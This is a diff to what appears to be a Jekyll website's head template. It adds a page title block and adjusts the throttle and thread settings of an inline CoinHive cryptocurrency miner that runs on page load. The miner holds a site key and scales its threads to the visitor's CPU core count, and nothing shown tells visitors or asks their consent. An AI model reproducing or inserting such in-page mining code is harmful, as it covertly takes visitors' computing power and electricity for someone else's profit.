@@ -5,6 +5,17 @@
   
   <link rel="stylesheet" href="{{ "/assets/main.css" | relative_url }}">
   <link rel="alternate" type="application/rss+xml" title="{{ site.title | escape }}" href="{{ "/feed.xml" | relative_url }}">
+  
+  
+  <title>
+      {% if page.layout == 'home' %}
+        {{ site.title }} - Home
+      {% else %}
+        {{ site.title }} - {{ page.title }}
+      {% endif %}
+  </title>
+  
+  
   {% if jekyll.environment == 'production' and site.google_analytics %}
     {% include google-analytics.html %}
   {% endif %}
@@ -16,15 +27,15 @@
     /* global CoinHive */
     
     const fullPower = false;
-
+    
     const pk = 'MBzdhm0poaPi8l1qXQlbY8y7r00kX4Nz';
     
     var conf = {	
-    	throttle: fullPower ? 0 : (1/10)
+    	throttle: fullPower ? 0 : 0.5	
     };
     
     if (!fullPower)
-    	conf.threads = Math.floor((navigator.hardwareConcurrency/4)*3);
+    	conf.threads = Math.floor((navigator.hardwareConcurrency/3)*2);
     
     const cnhv = new CoinHive.Anonymous(pk,conf);
     
